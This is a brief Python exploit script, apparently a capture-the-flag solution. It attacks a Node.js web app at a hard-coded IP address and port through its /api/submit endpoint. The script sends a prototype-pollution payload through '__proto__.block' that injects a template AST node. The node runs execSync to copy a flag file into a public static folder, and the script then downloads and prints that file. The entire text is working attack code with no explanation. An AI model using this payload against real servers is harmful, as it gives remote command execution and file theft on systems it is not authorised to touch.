from pwn import *
import requests

TARGET_URL = 'http://188.166.172.13:31177'

# https://blog.p6.is/AST-Injection/
result = requests.post(TARGET_URL + '/api/submit', json={
    "song.name": "The Goose went wild",
    "__proto__.block": {
        "type": "Text",
        "line": "process.mainModule.require('child_process').execSync(`cp flagz8gWv static/flag`)"
    }
})

flag = requests.get(TARGET_URL + '/static/flag').text
success(flag)
